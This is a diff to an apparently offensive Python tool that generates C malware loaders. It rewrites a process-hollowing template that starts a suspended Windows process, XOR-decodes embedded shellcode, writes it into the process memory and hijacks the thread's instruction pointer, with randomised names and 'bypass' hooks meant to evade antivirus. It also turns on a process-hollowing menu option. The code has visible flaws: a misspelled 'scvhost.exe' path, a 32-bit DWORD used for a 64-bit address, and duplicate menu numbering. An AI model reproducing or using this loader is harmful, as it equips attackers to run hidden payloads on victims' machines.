@@ -581,80 +581,114 @@ class Windows(ShellCoder):
         xor_key = self.make_random_str()
         encoded_shellcode = self.open_shellcode(xor_key)
         return """#include <windows.h>
-#include <winternl.h>
+#include <windows.h>
+#include <stdio.h>
 {bypass_imports}
-
-#define CREATE_SUSPENDED 0x4
-#define PROCESSBASICINFORMATION 0
 
 {bypass_functions}
 
+
 int main(int argc, char **argv) {{
-    if ({bypass_calls}) {{
-        unsigned char {proc_addr}[0x8];
-        unsigned char {data_buf}[0x200];
-        STARTUPINFO {s_info};
-        PROCESS_INFORMATION {p_info};
-        BOOL {c_result} = CreateProcess(NULL, "c:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL,
-            FALSE, CREATE_SUSPENDED, NULL, NULL, &{s_info}, &{p_info});
-        PROCESS_BASIC_INFORMATION {pb_info};
-        ULONG {ret_len} = 0;
-        LONG {q_result} = NtQueryInformationProcess({p_info}.hProcess, ProcessBasicInformation, &{pb_info}, sizeof({pb_info}), &{ret_len});
-        PVOID {base_image_addr} = (PVOID)((ULONG64){pb_info}.PebBaseAddress + 0x10);
-        SIZE_T {bytes_rw} = 0;
-        BOOL {result} = ReadProcessMemory({p_info}.hProcess, {base_image_addr}, {proc_addr}, sizeof({proc_addr}), &{bytes_rw});
-        PVOID {executable_address} = (PVOID)(*(ULONG64*){proc_addr});
-        {result} = ReadProcessMemory({p_info}.hProcess, {executable_address}, {data_buf}, sizeof({data_buf}), &{bytes_rw});
-        ULONG {e_lfanew} = *(ULONG*)({data_buf} + 0x3c);
-        ULONG {rva_offset} = {e_lfanew} + 0x28;
-        ULONG {rva} = *(ULONG*)({data_buf} + {rva_offset});
-        PVOID {entrypoint_addr} = (PVOID)((ULONG64){executable_address} + {rva});
-        char {xor_var}[] = "{xor_key}";
-        char {shellcode_var}[] = "{encoded_shellcode}";
-        char {shellcode}[sizeof {shellcode_var}];
-        int {counter_var} = 0;
-        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
-           if({counter_var} == sizeof {xor_var} -1) {{
-               {counter_var}=0;
-           }}
-           {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
-           {counter_var}++;
+
+if ({bypass_calls}) {{
+    char {xor_var}[] = "{xor_key}";
+    char {shellcode_var}[] = "{encoded_shellcode}";
+    char {shellcode}[sizeof {shellcode_var}];
+    
+    STARTUPINFO {si};
+    PROCESS_INFORMATION {pi};
+    CONTEXT {ctx};
+    DWORD {old_protect};
+    BOOL {res};
+
+    ZeroMemory(&{si}, sizeof({si}));
+    {si}.cb = sizeof({si});
+    ZeroMemory(&{pi}, sizeof({pi}));
+
+    {res} = CreateProcess(
+        "C:\\\\Windows\\\\System32\\\\scvhost.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        &{si},
+        &{pi}
+    );
+
+    if (!{res}) {{
+        return 1;
+    }}
+
+    {ctx}.ContextFlags = CONTEXT_FULL;
+    {res} = GetThreadContext({pi}.hThread, &{ctx});
+    
+    if (!{res}) {{
+        return 2;
+    }}
+
+    DWORD {base_address};
+    if (!ReadProcessMemory({pi}.hProcess, (LPCVOID)({ctx}.Rbx + 8), &{base_address}, sizeof(DWORD), NULL)) {{
+        return 3;
+    }}
+    
+    int {counter_var} = 0;
+    for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
+        if({counter_var} == sizeof {xor_var} -1) {{
+            {counter_var}=0;
         }}
-        {result} = WriteProcessMemory({p_info}.hProcess, {entrypoint_addr}, {shellcode}, sizeof({shellcode}), &{bytes_rw});
-        DWORD {r_result} = ResumeThread({p_info}.hThread);
-        WaitForSingleObject({p_info}.hProcess, INFINITE);
-        CloseHandle({p_info}.hProcess);
-        CloseHandle({p_info}.hThread);
+        {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
+        {counter_var}++;
+    }}
+
+    if (!VirtualProtectEx({pi}.hProcess, (LPVOID){base_address}, sizeof({shellcode}), PAGE_EXECUTE_READWRITE, &{old_protect})) {{
+        return 4;
+    }}
+
+    if (!WriteProcessMemory({pi}.hProcess, (LPVOID){base_address}, {shellcode}, sizeof({shellcode}), NULL)) {{
+        return 5;
+    }}
+
+    if (!VirtualProtectEx({pi}.hProcess, (LPVOID){base_address}, sizeof({shellcode}), {old_protect}, &{old_protect})) {{
+        return 6;
+    }}
+
+    {ctx}.Rip = {base_address};
+
+    if (!SetThreadContext({pi}.hThread, &{ctx})) {{
+        return 7;
+    }}
+
+    if (ResumeThread({pi}.hThread) == -1) {{
+        return 8;
+    }}
+
+    CloseHandle({pi}.hThread);
+    CloseHandle({pi}.hProcess);
+
+        return 0;
     }}
 }}
+
         """.format(
-            bypass_imports=bypass_imports,
-            bypass_functions=bypass_functions,
-            bypass_calls=bypass_calls,
-            proc_addr=self.make_random_str(),
-            data_buf=self.make_random_str(),
-            s_info=self.make_random_str(),
-            p_info=self.make_random_str(),
-            c_result=self.make_random_str(),
-            pb_info=self.make_random_str(),
-            ret_len=self.make_random_str(),
-            q_result=self.make_random_str(),
-            base_image_addr=self.make_random_str(),
-            bytes_rw=self.make_random_str(),
-            result=self.make_random_str(),
-            executable_address=self.make_random_str(),
-            e_lfanew=self.make_random_str(),
-            rva_offset=self.make_random_str(),
-            rva=self.make_random_str(),
-            entrypoint_addr=self.make_random_str(),
             xor_var=self.make_random_str(),
             xor_key=xor_key,
             shellcode_var=self.make_random_str(),
             shellcode=self.make_random_str(),
             encoded_shellcode=self.open_shellcode(xor_key),
+            bypass_imports=bypass_imports,
+            bypass_functions=bypass_functions,
+            bypass_calls=bypass_calls,
+            si=self.make_random_str(),
+            pi=self.make_random_str(),
+            ctx=self.make_random_str(),
+            old_protect=self.make_random_str(),
+            res=self.make_random_str(),
+            base_address=self.make_random_str(),
             counter_var=self.make_random_str(),
             increment_var=self.make_random_str(),
-            r_result=self.make_random_str(),
         )
 
     def shellcode_runner_template(self, bypass_functions, bypass_calls, bypass_imports):
@@ -892,12 +926,11 @@ int main(int argc, char **argv) {{
             cprint(" What injection technique do you want use?", "white", "on_blue")
             print(emoji.emojize(":right_arrow:") + " [1] - shellcode runner")
             print(emoji.emojize(":right_arrow:") + " [2] - process injection")
-            # print(emoji.emojize(":right_arrow:") + " [2] - process hollowing")
+            print(emoji.emojize(":right_arrow:") + " [2] - process hollowing")
 
             selected_answer = input(" ? ")
 
-            # if selected_answer not in ("1", "2", "3"):
-            if selected_answer not in ("1", "2"):
+            if selected_answer not in ("1", "2", "3"):
                 selected_answer = None
 
         return selected_answer
